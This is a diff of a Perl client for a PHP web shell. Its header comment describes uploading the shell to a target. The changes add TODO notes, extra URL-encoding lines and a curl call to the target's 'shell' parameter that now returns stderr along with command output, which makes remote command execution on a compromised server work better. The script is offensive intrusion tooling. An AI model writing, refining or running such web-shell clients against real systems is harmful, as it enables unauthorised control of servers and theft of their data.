@@ -12,9 +12,9 @@
 #   and have them run       #     after that             #
 #   separately (split?)     #   - Try not to make        #
 # - Fix ctrl-C              #     commands too complex   #
-# - remove global vars      #                            #
-# - clean up code, always   #                            #
-# - Base64 encode URL       #                            #
+# - remove global vars      #   - cd will bug out a bit  #
+# - clean up code, always   #     if there are multiple  #
+# - Base64 encode URL       #     in one command         #
 ##########################################################
 # Here is the simple shell to upload to the target	 #
 # <?php                                                  #
@@ -86,9 +86,11 @@ sub shell{
 	print "$pwd $user\$ "; #prints shell-like prompt
 	chomp(my $input = <STDIN>);
 	my @parts = split(';',$input);
-	#next two lines URL Encode certain characters, to be replaced by URLEncode function
+	#next four lines URL Encode certain characters, to be replaced by URLEncode function
 	$input =~ s/ /%20/g;
 	$input =~ s/;/%3B/g;
+	#$input =~ s/&/%26/g;
+	#$input =~ s/>/%3E/g;
 	if ($input eq "quit" || $input eq "exit"){
 		exit;
 	}
@@ -99,7 +101,7 @@ sub shell{
 		}
 	}
 
-	chomp(my $output = `curl -s $loc?shell=cd%20$pwd%3B$input`); #runs command and captures output
+	chomp(my $output = `curl -s $loc?shell=cd%20$pwd%3B$input%202%3E%261`); #runs command and captures output
 	#clean up output
 	StripTags($output,1);
 	chomp($output);
